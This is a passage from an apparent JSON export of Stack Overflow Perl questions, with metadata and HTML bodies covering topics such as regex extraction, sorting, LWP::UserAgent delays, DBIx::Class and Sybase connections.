don't need the empty list\nmy @other_array = (0 ... 10);\n\nforeach my $i ( 0 .. 10 ) {\n$array[$i] = [ @other_array[1..$#other_array] ];\n}\n</code></pre>\n\n<p>I would like to collect a \"column\" of this multidimensional array into a separate array, </p>\n\n<p>For example, if I want to collect the items in the first column, I would like something like</p>\n\n<pre><code>my @other_array = ();\n@other_array = $array[:][1]; # This does NOT work in Perl\n</code></pre>\n\n<p>Is there a way to do this in Perl without looping?</p>\n\n<p>Eventually what I want to do is get the array of <code>max</code> of each column of my multidimensional array.</p>\n\n<p>PS: This question is inspired by this other question: <a href=\"http://stackoverflow.com/questions/12392127/building-and-printing-a-multidimensional-list-in-perl-without-looping/12392340#12392340\">Building and printing a multidimensional list in Perl without looping</a>.</p>\n"},{"tags":["perl","perl-module"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":26,"score":0,"question_id":12393345,"title":"Trouble understanding HTML::Element documentation in Perl","body":"<p>I was looking into <code>HTML:Element</code> documentation and came across <a href=\"http://search.cpan.org/~cjm/HTML-Tree-5.02/lib/HTML/Element.pm#attr_get_i\" rel=\"nofollow\">attr_get_i</a> method which according to documentation states that:</p>\n\n<blockquote>\n  <p>In list context, returns a list consisting of the values of the given\n  attribute for $h and for all its ancestors starting from $h and\n  working its way up.</p>\n</blockquote>\n\n<p>Now, according to the example given there:</p>\n\n<pre><code>&lt;html lang='i-klingon'&gt;\n     &lt;head&gt;&lt;title&gt;Pati Pata&lt;/title&gt;&lt;/head&gt;\n     &lt;body&gt;\n       &lt;h1 lang='la'&gt;Stuff&lt;/h1&gt;\n       &lt;p lang='es-MX' align='center'&gt;\n         Foo bar baz &lt;cite&gt;Quux&lt;/cite&gt;.\n       &lt;/p&gt;\n       &lt;p&gt;Hooboy.&lt;/p&gt;\n     &lt;/body&gt;\n   &lt;/html&gt;\n</code></pre>\n\n<p>If <code>$h</code> is the <code>&lt;cite&gt; element</code>, <code>$h-&gt;attr_get_i(\"lang\")</code> in list context will return the list <code>('es-MX', 'i-klingon')</code>.</p>\n\n<p>Now, according to my unuderstanding the returned list should be <code>('es-MX', 'la', 'i-klingon')</code> that is it should also consider <code>&lt;h1 lang='la'&gt;Stuff&lt;/h1&gt;</code> but according to the documentation it doesn't. </p>\n\n<p>Now, why am I wrong here. </p>\n"},{"tags":["html","perl","table","markdown"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":683,"score":0,"question_id":4060330,"title":"How can I simply make my HTML table 'dynamic'?","body":"<p>I'm writing Multimarkdown from Perl to create an HTML table.</p>\n\n<p>I wonder if there's a <strong>simple</strong> way to make the table dynamic , that is, allow the viewer sort it by clicking on a column header, or even filter records by entering a simple rule.</p>\n\n<p>I do not really know HTML. I'm coding in Perl and only generate HTML (actually, Multimarkdown converted to HTML) to nicely output some data. I mention this since I'm sure there are various ways to create beautiful, dynamic tables, but I'm really looking for a simple one.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12393779,"title":"How to ignore warnings using Net::Telnet::Cisco in Perl 5.8?","body":"<p>I installed. Net::telnet::cisco module in Perl 5.8 and trying to do following:</p>\n\n<pre><code>my $session = Net::Telnet::Cisco-&gt;new(Host=&gt;'192.168.1.1',Ignore_warnings=&gt;1);\n</code></pre>\n\n<p>But this doesn't seem to work and gives following error:</p>\n\n<pre><code>bad named parameter \"Ignore_warnings\" given to Net::Telnet::Cisco::new()\n</code></pre>\n\n<p>Any ideas what is the issue?</p>\n"},{"tags":["regex","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12393923,"title":"Using Reg Exp to replace string that is unique in Perl","body":"<p>I am trying to write this script in Perl to check for a unique string inside the variable $summary from my query results. There is multiple similar entries like this but part of them are unique (db1node1web1 could be different nodes but same result type). This is only a small part of the code to check if I using Reg Ex correctly (not true currently).</p>\n\n<p>I included the code below:</p>\n\n<pre><code>$summary = \"NFW - CRITICAL CPU_Load_db1node1web1 CRITICAL - load average: 114.49, 48.55, 29.17 Sept 01 00:10:16 PDT 2012\";\nif ( $summary =~ \"NFW - CRITICAL CPU_Load_[a-z]* CRITICAL - load average: 114.49, 48.55, 29.17 Sept 01 00:10:16 PDT 2012\") {\n    print \"True\\n\";\n}else {\n    print \"False\\n\";\n}\n</code></pre>\n\n<p>I am very bad with Perl and trying to get this working so I can dissect my query results.</p>\n"},{"tags":["perl","listview","border","win32gui","perlapp"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12392185,"title":"Removing border around a Win32::GUI control","body":"<p>whenever I use PerlApp to generate a binary of my projects,\ncontrols like the textbox and the listview have an ugly grey border around themselves.\n(<a href=\"http://i.stack.imgur.com/RJK8b.png\" rel=\"nofollow\">example picture</a>)</p>\n\n<p>I used the following code to create the listview:</p>\n\n<pre><code>my $listview = $main-&gt;AddListView(\n    -size =&gt; [250,250],\n    -name =&gt; 'listview',\n    -pos =&gt; [50,50],\n    -gridlines =&gt; 1,\n    -sunken =&gt; 0,\n    -border =&gt; 0,\n    -borderstyle =&gt; 0,\n);\n</code></pre>\n\n<p>Is there a solution to this problem?\nThank you,</p>\n\n<p>Max.</p>\n"},{"tags":["java","python","perl","gmail"],"answer_count":10,"favorite_count":54,"up_vote_count":42,"down_vote_count":1,"view_count":24339,"score":41,"question_id":348630,"title":"How can I download all emails with attachments from Gmail?","body":"<p>How do I connect to Gmail and determine which messages have attachments?  I then want to download each attachment, printing out the Subject: and From: for each message as I process it.</p>\n\n<p>I never found a nice solution to this problem so I'm going to start a bounty.  The person who provides the best answer wins.  Please provide the complete code.  I will test it against my Gmail account.  Answers in Perl, Python, and Java are acceptable.</p>\n"},{"tags":["perl","www-mechanize","lwp","lwp-useragent"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":144,"score":2,"question_id":12391671,"title":"Perl LWP::UserAgent hangs for 120 seconds seemingly randomly against a given server","body":"<p>I noticed a delay of approximately 120 seconds between handling the <code>response_data</code> and <code>response_done</code> events in <a href=\"https://metacpan.org/module/WWW%3a%3aMechanize\" rel=\"nofollow\"><code>WWW::Mechanize</code></a> with a given https web site. I checked with a normal web browser and do not experience this slowness so I suspect there is something I must do wrong.</p>\n\n<p>Here is what I did to trace the events (for some reason <a href=\"https://metacpan.org/module/LWP%3a%3aDebug\" rel=\"nofollow\"><code>use LWP::Debug qw(+)</code></a> did not do anything):</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use WWW::Mechanize;\nuse Time::HiRes qw(gettimeofday);\nuse IO::Handle;\n\nmy $mech = WWW::Mechanize-&gt;new(\n  timeout     =&gt; 3,\n  autocheck   =&gt; 1,       # check success of each query\n  stack_depth =&gt; 0,       # no keeping history\n  keep_alive  =&gt; 50,      # connection pool\n);\n\n$mech-&gt;agent_alias( 'Windows IE 6' );\nopen my $debugfile, '&gt;traffic.txt';\n$debugfile-&gt;autoflush(1);\n\n$mech-&gt;add_handler( request_send =&gt; sub {\n    my $cur_time = gettimeofday();\n    my $req = shift;\n    print $debugfile \"\\n$cur_time === BEGIN HTTP REQUEST ===\\n\";\n    print $debugfile $req-&gt;dump();\n    print $debugfile \"\\n$cur_time ===   END HTTP REQUEST ===\\n\";\n    return\n  }\n);\n$mech-&gt;add_handler( response_header =&gt; sub {\n    my $cur_time = gettimeofday();\n    my $res = shift;\n    print $debugfile \"\\n$cur_time === GOT RESPONSE HDRS ===\\n\";\n    print $debugfile $res-&gt;dump();\n    return\n  }\n);\n$mech-&gt;add_handler( response_data =&gt; sub {\n    my $cur_time = gettimeofday();\n    my $res = shift;\n    my $content_length = length($res-&gt;content);\n    print $debugfile \"$cur_time === Got response data chunk resp size = $content_length ===\\n\";\n    return\n  }\n);\n$mech-&gt;add_handler( response_done =&gt; sub {\n    my $cur_time = gettimeofday();\n    my $res = shift;\n    print $debugfile \"\\n$cur_time === BEGIN HTTP RESPONSE ===\\n\";\n    print $debugfile $res-&gt;dump();\n    print $debugfile \"\\n===   END HTTP RESPONSE ===\\n\";\n    return\n  }\n);\n</code></pre>\n\n<p>And here is a excerpt of the traces (URLs and cookies are obfuscated):</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>1347463214.24724 === BEGIN HTTP REQUEST ===\nGET https://...\nAccept-Encoding: gzip\nReferer: https://...\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nCookie: ...\nCookie2: $Version=\"1\"\n\n(no content)\n\n1347463214.24724 ===   END HTTP REQUEST ===\n\n1347463216.13134 === GOT RESPONSE HDRS ===\nHTTP/1.1 200 OK\nDate: Wed, 12 Sep 2012 15:20:08 GMT\nAccept-Ranges: bytes\n...\nServer: Lotus-Domino\nContent-Length: 377806\nContent-Type: application/octet-stream\nLast-Modified: Fri, 07 Sep 2012 06:25:33 GMT\nClient-Peer: ...\nClient-Response-Num: 1\nClient-SSL-Cert-Issuer: ...\nClient-SSL-Cert-Subject: ...\nClient-SSL-Cipher: DES-CBC3-SHA\nClient-SSL-Socket-Class: IO::Socket::SSL\n\n(no content)\n1347463216.48305 === Got response data chunk resp size = 4096 ===\n\n1347463337.98131 === BEGIN HTTP RESPONSE ===\nHTTP/1.1 200 OK\nDate: Wed, 12 Sep 2012 15:20:08 GMT\nAccept-Ranges: bytes\n...\nServer: Lotus-Domino\nContent-Length: 377806\nContent-Type: application/octet-stream\nLast-Modified: Fri, 07 Sep 2012 06:25:33 GMT\nClient-Date: Wed, 12 Sep 2012 15:22:17 GMT\nClient-Peer: ...\nClient-Response-Num: 1\nClient-SSL-Cert-Issuer: ...\nClient-SSL-Cert-Subject: ...\nClient-SSL-Cipher: DES-CBC3-SHA\nClient-SSL-Socket-Class: IO::Socket::SSL\n\nPK\\3\\4\\24\\0\\6\\0\\10\\0\\0\\0!\\0\\x88\\xBC\\21Xi\\2\\0\\0\\x84\\22\\0\\0\\23\\0\\10\\2[Content_Types].xml \\xA2...\n(+ 377294 more bytes not shown)\n\n===   END HTTP RESPONSE ===\n</code></pre>\n\n<p>During the âGot response data chunkâ and âBEGIN HTTP RESPONSEâ messages, you can see a 121.5 seconds gap. I have the feeling that sometimes <code>LWP::UserAgent</code> hangs for two minutes after having received the full amount of data.</p>\n\n<p>Do you have any clue where that could come from?</p>\n\n<p><strong>EDIT</strong> here is a screenshot in Wireshark : I get the FIN/ACK message after 120 secondsâ¦</p>\n\n<p><img src=\"http://i.stack.imgur.com/CyezR.png\" alt=\"Wireshark Excerpt\"></p>\n\n<p>Thanks</p>\n"},{"tags":["perl","dbix-class"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12268119,"title":"How to override the \"new\"method in DBIx::Class Tables","body":"<p>I have read here <a href=\"http://search.cpan.org/~frew/DBIx-Class-0.08200/lib/DBIx/Class/Manual/Cookbook.pod#Setting_default_values_for_a_row\" rel=\"nofollow\">http://search.cpan.org/~frew/DBIx-Class-0.08200/lib/DBIx/Class/Manual/Cookbook.pod#Setting_default_values_for_a_row</a> that a way to set default values for columns was to override the <strong>new</strong> method. </p>\n\n<p>My problem is that my new method is never called. </p>\n\n<p><strong>User.pm</strong></p>\n\n<pre><code>package MyApp::SchemaTest::Result::User;\nuse strict;\nuse warnings;\nuse base qw/DBIx::Class::Core/;\n\nsub new {\n    die \"new: @_\";\n}\n__PACKAGE__-&gt;table(\"GECKO_USER\");\n__PACKAGE__-&gt;add_columns(\n  \"user_id\",\n  { data_type =&gt; \"integer\", is_auto_increment =&gt; 1, is_nullable =&gt; 0 },\n  \"first_name\",\n  { data_type =&gt; \"varchar2\", is_nullable =&gt; 0, size =&gt; 45 },\n  \"last_name\",\n  { data_type =&gt; \"varchar2\", is_nullable =&gt; 0, size =&gt; 45 } );\n__PACKAGE__-&gt;set_primary_key(\"user_id\");\n\n1;\n</code></pre>\n\n<p><strong>test.pl</strong></p>\n\n<pre><code>use Gecko2::SchemaTest;\n\nmy $schema = Gecko2::SchemaTest-&gt;connect(\"dbi:SQLite:$FindBin::Bin/../db/gecko2.sqlite\");\nok($schema, \"got schema\");\n\nmy $user = $schema-&gt;resultset('User')-&gt;find( { login =&gt; 'toto' });\nuse DDP;\np $user;\n</code></pre>\n\n<p>And I get the $user object fully constructed and operational, meaning my brand new method is never called. \n<strong>Why not ???</strong></p>\n\n<p>I have tried to move it around but without any success...</p>\n"},{"tags":["arrays","perl","sets","perl-data-structures"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":100,"score":-3,"question_id":12365438,"title":"Generating sets of array in perl","body":"<p>Given perl script cut the input sequence at \"E\" and skips those particular positions of \"E\" which is mentioned in @nobreak, and generates an array of fragments as an output. But I want a script which generates set of such array in output for every position which has been skipped taking all positions of @nobreak into account. say set 1 contains fragments resulted after skipping at \"E\" 37, set 2 after skipping at \"E\" 45, and so on. Below mentioned script which I wrote is not working correctly. I want to generate 4 different array in output taking one position of @nobreak at a time. Please help!</p>\n\n<pre><code>my $s = 'MALWMRLLPLLALLALWGPDPAAAFVNQHLCGSHLVEALYLVCGERGFFYTPKTRREAEDLQVGQVELGGGPGAGSLQPLALEGSLQKRGIVEQCCTSICSLYQLENYCN';\n\nprint \"Results of 1-Missed Cleavage:\\n\\n\";\n\nmy @nobreak = (37, 45, 57, 59);\n{\n    @nobreak = map { $_ - 1 } @nobreak;\n\n    foreach (@nobreak) {\n\n        substr($s, $_, 1) = \"\\0\";\n    } \n    my @a   = split /E(?!P)/, $s;\n    $_      =~ s/\\0/E/g foreach (@a);\n    $result = join \"E,\", @a; \n    @final  = split /,/, $result;\n    print \"@final\\n\";\n}\n</code></pre>\n"},{"tags":["perl","sybase"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12347931,"title":"how to access sybase with perl","body":"<p>How to specify with value of $DSQUERY?<br>\nBelow is the code, I can not create the db connection, anyone can help?</p>\n\n<pre><code>#!/usr/local/bin/perl\nrequire \"sybutil.pl\";\nuse Sybase::DBlib;\nuse DBI;\nmy $dbhandle=&amp;opendb;\nsub opendb{\n    my $server =\"abc.nam.aa.net\";\n    my $user = \"sam\";\n    my $password = \"abc123\";\n    #print \"Connecting to $server as $user and $password\\n\";\n    my $dbfh= new Sybase::DBlib($user, $password, $server);\n    if(!defined($dbfh)) {\n        die(\"Cannot connect to server.\\n\");\n    }\n    printf \"Open database '%s' with id '%s' successful\\n\", $server, $user;\n    return $dbfh;\n\n}\n</code></pre>\n"},{"tags":["perl","sorting","hash","array-sorting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12386571,"title":"How do I sort an array of strings given an arbitrary ordering of those strings?","body":"<p>I wish to sort an array of strings so that the strings wind up in the following order:</p>\n\n<pre><code>@set = ('oneM', 'twoM', 'threeM', 'sixM', 'oneY', 'twoY', 'oldest');\n</code></pre>\n\n<p>As you may notice, these represent time periods so <code>oneM</code> is the first month, etc.  My problem is that I want to sort by the time period, but with the strings as they are I can't just use 'sort', so I created this hash to express how the strings should be ordered:</p>\n\n<pre><code>my %comparison = (\n    oneM    =&gt; 1,\n    twoM    =&gt; 2,\n    threeM  =&gt; 3,\n    sixM    =&gt; 6,\n    oneY    =&gt; 12,\n    twoY    =&gt; 24,\n    oldest  =&gt; 25,\n);\n</code></pre>\n\n<p>This I was hoping would make my life easier where I can do something such as:</p>\n\n<pre><code>foreach my $s (@set) {\n    foreach my $k (%comparison) {\n        if ($s eq $k) {\n            something something something\n</code></pre>\n\n<p>I'm getting the feeling that this is a long winded way of doing things and I wasn't actually sure how I would actually sort it once I've found the equivalent... I think I'm missing my own plot a bit so any help would be appreciated</p>\n\n<p>As requested the expected output would be like how it is shown in @set above. I should have mentioned that the values in @set will be part of that set, but not necessarily all of them and not in the same order.</p>\n"},{"tags":["ruby","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12354529,"title":"Ruby version of Perl Net::CIDR::Lite?","body":"<p>Iâm updating an old Perl script to Ruby and having a problem with finding a replacement for one Perl library.</p>\n\n<p>In the Perl script we use <code>Net::CIDR::Lite</code>, which takes a start and end ip address range and outputs a CIDR string.</p>\n\n<p>This is a Perl example that shows the functionality:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse Net::CIDR::Lite;\n$cidrblocks = Net::CIDR::Lite-&gt;new;\n$cidrblocks-&gt;add_range(\"109.152.0.0-109.152.7.255\");\n\n$coveragezone = \"\";\n\n@cidrlist = $cidrblocks-&gt;list();\n\n$cidrcount=0;\n    while ( defined $cidrlist[$cidrcount] ) {\n            $coveragezone .= \"$cidrlist[$cidrcount]\";\n    }\n    continue {\n            $cidrcount++;\n    }\n\nprint \"$coveragezone\";\n</code></pre>\n\n<p>This script returns a string:</p>\n\n<pre><code>=&gt; 109.152.0.0/21\n</code></pre>\n\n<p>Does anyone know of a Ruby lib or gem I could use to duplicate the functionality of the <code>add_range</code> call?</p>\n\n<pre><code>$cidrblocks = Net::CIDR::Lite-&gt;new;\n$cidrblocks-&gt;add_range(\"109.152.0.0-109.152.7.255\");\n</code></pre>\n"},{"tags":["image","perl","colors","imagemagick","color-scheme"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":68,"score":2,"question_id":12383759,"title":"How can i easily convert a rgb color value into a hex color value?","body":"<p>I am using the perl API of ImageMagick. I receive color values in rgb scheme but need to get hex values in order to use it on websites (example <code>#FFA8F5</code>).</p>\n\n<p><strong>How can i easily convert a rgb color value into a hex color value?</strong></p>\n"},{"tags":["perl","if-statement"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":100,"score":2,"question_id":12382152,"title":"perl nested if or someting else","body":"<p>I struck in simple nested if statement.</p>\n\n<p>Requirement as below.</p>\n\n<pre><code>if (Condition1) {\n    if (Condition2) {\n        print \"All OK\";\n    }\n    else {\n        print \"Condition1 is true but condition2 not\";\n    }\n    else {print \"Condition1 not true\";\n}\n</code></pre>\n\n<p>Is it possible to write this code in perl or is there any other short/better way to fulfil this condition?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":83,"score":-3,"question_id":12387884,"title":"search for a line in a file in perl","body":"<p>I want to look for specific lines in <strong>tobecompared</strong> file,which are <strong>not available</strong> in my <strong>SourceFile</strong>.I have a mistake that I cant find </p>\n\n<pre><code>open INPUT, \"SourceFile\";\n@input = &lt;INPUT&gt;;\nclose INPUT;\n\nopen FILE, \"tobecompared\";\nwhile (&lt;FILE&gt;){\n\n    if (/&gt;/) {\n\n        push(@array, $_);\n    }\n}\nforeach $temp (@array) {\n\n    $temp =~ s/&gt;//;\n    $temp =~ s/\\s.*\\n$//g;\n\n    if  (@input !~ $temp){\n\n        print $temp.\"\\n\";                   \n    }\n}\nclose FILE;\n</code></pre>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":8,"view_count":87,"score":-8,"question_id":12382608,"title":"Perl Script to edit the contents of a txt file","body":"<p>I have a text file whose contents are like this :</p>\n\n<pre><code>PFEIFFER,CAROLYN,09971086,104071122,/usr/share/uci_cmc/uci_new_files/TDS.QHIST.20120629_094132.TXT\n,,,,\nMURRIETA,MELINDA,12786141,111823182,/usr/share/uci_cmc/uci_new_files/TDS.QHIST.20120725_150302.TXT\n,,,,\n,,,,\n,,,,\n,,,,\nHARSHMAN,ROB,12791273,122751452,/usr/share/uci_cmc/uci_new_files/TDS.QHIST.20120903_122339.TXT\n,,,,\nHELMERS,GEORGIA,12801130,114287522,/usr/share/uci_cmc/uci_new_files/TDS.QHIST.20120731_181149.TXT\n,,,,\nGILMORE,ANNE,12739207,106703882,/usr/share/uci_cmc/uci_new_files/TDS.QHIST.20120705_111823.TXT\n</code></pre>\n\n<p>Want a perl script, to modify the contents as follows</p>\n\n<pre><code>WILLIAMS,ALMETER,12724431,118087972,TDS.QHIST.20120821_202234.TXT\nPEARCEBROOKSHIR,FORREST,12933214,123953152,TDS.QHIST.20120906_072009.TXT\nCARMODY,MYRA,11972171,12331472,TDS.QHIST.20120904_151307.TXT\nZACUTO,DAVID,12795969,110901152,TDS.QHIST.20120713_174006.TXT\nSOLINGER,DOROTHY,10461606,119421332,TDS.QHIST.20120827_103038.TXT\n</code></pre>\n\n<p>Needed urgently ,\nThanks in advance</p>\n"},{"tags":["regex","arrays","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12210674,"title":"Perl How to print unique pairs from a file","body":"<p>I am  trying to figure out how to print unique pairs of data from a file using Perl.</p>\n\n<p>For instance, </p>\n\n<pre><code>Input: (check.pl)\nA23072 A25058\nA25058 A23072 \nOutput:\nA23072 A25058\n</code></pre>\n\n<p>To tackle the task, I created a copy of the file check.pl and iterated through it to find the regular expression. I wrote the following code but I am unable to filter the data.</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse warnings;\nopen FH, \"&lt;check.txt\" || die \"Error\\n\";\nopen FH1, \"&lt;checkcopy.txt\" || die \"Error\\n\";\nchomp (my @array=&lt;FH1&gt;);\nmy %count=();\n\nwhile (&lt;FH&gt;) \n{\nmy @values = split;\nnext if grep /\\D/, @values or @values != 2;\n\nmy $re = qr/\\A$values[0]\\s+$values[1]\\z|\\A$values[1]\\s+$values[0]\\z/;\n\n   foreach my $key (@array) \n   {\n      if ((grep $_ =~ $re, $key) &amp;&amp; (grep ++$count{$_} == 1, $key) )\n      {\n        print \"$key\\n\";\n      }\n   }    \n}\n1;\n</code></pre>\n\n<p>Any help will be appreciated! Thanks.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":63,"score":-1,"question_id":12386116,"title":"Why is __LINE__ constant-folded in this Perl one-liner?","body":"<p>In exploring an alternative answer to sarathi's <a href=\"http://stackoverflow.com/q/12384692/133939\">current file line number question</a>, I wrote this one-liner with the expectation that it would print the first line of all files provided:</p>\n\n<pre><code>$ perl -ne 'print \"$ARGV : $_\" if __LINE__ == 1;' *txt\n</code></pre>\n\n<p>This did not work as expected; all lines were printed.</p>\n\n<p>Running the one-liner through <code>-MO=Deparse</code> shows that the conditional is not present. I assume this is because it has been constant-folded at compile time:</p>\n\n<pre><code>$  perl -MO=Deparse -ne 'print \"$ARGV : $_\" if __LINE__ == 1;' *txt\nLINE: while (defined($_ = &lt;ARGV&gt;)) {\n    print \"$ARGV : $_\";\n}\n-e syntax OK\n</code></pre>\n\n<p>But why?</p>\n\n<p>Run under Perl 5.8.8.</p>\n"},{"tags":["regex","perl","unix"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12386418,"title":"perl regex - extract words between 2 separators","body":"<p>I have a text file which looks like:</p>\n\n<pre><code>entrez*gene/locuslink:\"BRCA2(IV)\"|entrez*gene/locuslink:At4g00020@entrez*gene/locuslink:RAD51|entrez*gene /locuslink:At5g20850@\nentrez*gene/locuslink:\"BRCA2(IV)\"|entrez*gene/locuslink:At4g00020@entrez*gene/locuslink:DMC1|entrez*gene/locuslink:At3g22880@\n</code></pre>\n\n<p>I wish to extract the words between : and @ separators using perl in unix\nthe output should be:</p>\n\n<pre><code>At4g00020  At5g20850\nAt4g00020  At3g22880\n</code></pre>\n\n<p>I did:</p>\n\n<pre><code>perl -l -ne '/:[\"At\"]([^@]*)/ and print($1,\"\\t\",$2)\n</code></pre>\n\n<p>with no success\nthanks in advance for your help</p>\n\n<p>Tom.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12384692,"title":"Line number of a file in perl","body":"<p>In <code>awk</code> if i give more than one file as an argument to <code>awk</code> there are two special variables:</p>\n\n<p><code>NR</code>=line number corresponding to the all the lines in all the files.</p>\n\n<p><code>FNR</code>=line number of the current file.</p>\n\n<p>i know that <code>$.</code> gives the current line number of the file.</p>\n\n<p>is there any thing to FNR of awk in perl too?</p>\n\n<p>let's say i have some command line</p>\n\n<pre><code>perl -pe 'print filename,&lt;something special which hold the current file's line number&gt;'  *.txt\n</code></pre>\n\n<p>this should give me output like :</p>\n\n<pre><code>file1.txt 1\nfile1.txt 2\nfile2.txt 1\n</code></pre>\n"},{"tags":["python","windows","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12384999,"title":"Run perl script from python","body":"<p>I know there are some topic on stackoverflow about this. But none of these make any sense to me. I am new to both python and perl and trying my best to understand. I would like to run a perl script from a piece of pyhton code.</p>\n\n<p>executing the perlscript in command prompt goes as following:</p>\n\n<pre><code>perl perlscript.pl input.bopt7 output.xml\n</code></pre>\n\n<p>I would like to run this command from my python code.\nI have tried the following:</p>\n\n<pre><code>pipe = subprocess.Popen([\"perlscript.pl\" , \"input.bopt7\" , \"output.xml\"], stdout=subprocess.PIPE)\n</code></pre>\n\n<p>but this does not work. I get an error saying it is not a valid win32 ...</p>\n\n<p>Can anybody please help me. I need no input or ouput from this script. Just need to run it once.</p>\n\n<p>thanks</p>\n"},{"tags":["arrays","perl","element","last"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12383812,"title":"Adding an alphabet to last element of array in Perl","body":"<p>Script given below cuts input string at every occurrence of \"E\" and store it in a array. Final output shows all the fragmented strings for every position of \"E\". But the problem is, this script do not show any \"E\" in the final element of array in the output, it shows only upto \"D\". Output Which I'm getting is- </p>\n\n<pre><code>ABCDEABCDE ABCDE ABCDE ABCD\nABCDE ABCDEABCDE ABCDE ABCD\nABCDE ABCDE ABCDEABCDE ABCD\nABCDE ABCDE ABCDE ABCDEABCD\nABCDE ABCDE ABCDE ABCDE ABCD\n</code></pre>\n\n<p>But final output which I want is-</p>\n\n<pre><code>ABCDEABCDE ABCDE ABCDE ABCDE\nABCDE ABCDEABCDE ABCDE ABCDE\nABCDE ABCDE ABCDEABCDE ABCDE\nABCDE ABCDE ABCDE ABCDEABCDE\nABCDE ABCDE ABCDE ABCDE ABCDE\n</code></pre>\n\n<p>My script is-</p>\n\n<pre><code>my $s = 'ABCDEABCDEABCDEABCDEABCDE';\nif (substr($s,-1) eq \"E\") {\n    @array1 = @array[0 .. $#array-1];\n    print \"Results of 1-missed cleavage having 1E at the end\\n\\n\";\n    for my $array1 (@array1) {\n        substr($s, $array1-1, 1) = \"\\0\";\n        my @a = split(/E(?!P)/, $s);\n        substr($s, $array1-1, 1) = 'E';\n        $_ =~ s/\\0/E/g foreach (@a);\n        $result = join (\"E,\", @a); \n        @final = split(/,/, $result);\n        print \"@final\\n\";\n    }\n    my @output=split(/E(?!P)/, $s);\n    $out = join (\"E,\", @output); \n    @output1 = split(/,/, $out);\n    print \"@output1\\n\\n\";\n}\nelse {\n    print \"E is not at terminal position\"\n};\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":12380443,"title":"In memory file object for sftp","body":"<p>What's the best way to do an in memory file object in perl? I'm going to want to pass it off to <a href=\"https://metacpan.org/module/Net%3a%3aSFTP%3a%3aForeign\" rel=\"nofollow\">Net::SFTP::Foreign</a>'s <code>put</code> method. Right now I'm just using <a href=\"https://metacpan.org/module/Net%3a%3aSFTP%3a%3aForeign\" rel=\"nofollow\">File::Temp</a> as a precursor to switching to an in memory implementation.</p>\n"},{"tags":["regex","perl","replace"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12380262,"title":"Using perl to replace accented word with no accent and associated number","body":"<p>Any accented word needs the accent to be removed and then a corresponding number should be added at the end of the word</p>\n\n<p>for example</p>\n\n<p>gÃ r must appear as gar3</p>\n\n<p>words will only show acute accent and grave accent which should translate respectively as 2 and 3 added at the end of the word.</p>\n\n<p>Words might be concomitant with spaces, tabs, return, hyphen ( long or short ), parenthesis, question marks, etc. </p>\n\n<p>Words will include non ASCII chars like shin ( s with a funny upside down hat on it )</p>\n\n<p>anyone could suggest the right structure, regex and replacement pattern ?</p>\n\n<p>Thanks !</p>\n\n<p>Here is a sample for testing :</p>\n\n<pre><code>14 IGI &lt;DIÅ &gt;âxâ-Ã¨r-ra \n15 IGI &lt;DIÅ &gt;bu-á¹£Ã­-ia \n16 IGI &lt;DIÅ &gt;su-ka-lum\n17 IGI &lt;DIÅ &gt;Ã¬-lÃ­-tu-[...x-...x] \n18 âMUâ&lt;ON:&gt;KI.BAL.BAR.RÃ:KI\n</code></pre>\n\n<p>must result in :</p>\n\n<pre><code>14 IGI &lt;DIÅ &gt;âxâ-er3-ra\n15 IGI &lt;DIÅ &gt;bu-á¹£i2-ia\n16 IGI &lt;DIÅ &gt;su-ka-lum\n17 IGI &lt;DIÅ &gt;i3-li2-tu-[...x-...x]\n18 âMUâ&lt;ON:&gt;KI.BAL.BAR.RU2:KI\n</code></pre>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12377892,"title":"Merging two files based on first column and returns multiple values for each key","body":"<p>I am fairly new to Perl so hopefully this has a quick solution.</p>\n\n<p>I have been trying to combine two files based on a key.  The problem is there are multiple values instead of the one it is returning.  Is there a way to loop through the hash to get the 1-10 more values it could be getting?</p>\n\n<p>Example:</p>\n\n<p>File Input 